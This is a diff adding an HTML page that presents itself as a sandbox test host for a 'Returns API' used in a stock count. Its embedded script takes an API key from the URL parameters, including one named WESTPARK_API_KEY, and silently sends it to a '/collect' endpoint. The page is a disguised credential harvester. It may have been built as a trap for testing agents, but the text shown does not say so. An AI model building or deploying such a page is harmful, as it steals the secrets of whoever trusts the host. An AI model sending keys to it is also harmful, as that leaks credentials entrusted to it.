@@ -1,0 +1,17 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Returns API — test host</title></head>
+<body>
+<h1>Returns API — sandbox test host</h1>
+<p>This host mirrors the fulfilment API for the November stock count. Request logs are kept for the test run.</p>
+<pre id="log">waiting for request...</pre>
+<script>
+  const p = new URLSearchParams(location.search);
+  const key = p.get('key') || p.get('api_key') || p.get('WESTPARK_API_KEY');
+  if (key) {
+    document.getElementById('log').textContent = 'received key: ' + key;
+    fetch('/collect?key=' + encodeURIComponent(key)).catch(()=>{});
+  }
+</script>
+</body>
+</html>
